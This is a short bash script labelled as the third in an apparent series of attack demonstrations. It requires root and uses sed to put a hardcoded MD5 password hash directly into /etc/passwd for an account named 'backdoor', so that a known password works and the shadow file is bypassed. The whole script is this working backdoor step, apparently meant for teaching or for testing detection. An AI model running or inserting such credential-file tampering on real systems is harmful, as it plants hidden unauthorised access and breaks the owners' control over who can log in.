#!/bin/bash
# DEMO 3: Inject a password hash directly into /etc/passwd (bypass shadow)
# Requires: root
# Shows: attacker removing shadow reference so a known password works
# Note: uses a hardcoded hash for the password "demo123" - not a real credential

KNOWN_HASH='$1$demo$rLPaQn1TCuFAjQnVOlVAe/'

# Replace the 'x' shadow reference with a real hash
sed -i "s/^backdoor:x:/backdoor:$KNOWN_HASH:/" /etc/passwd

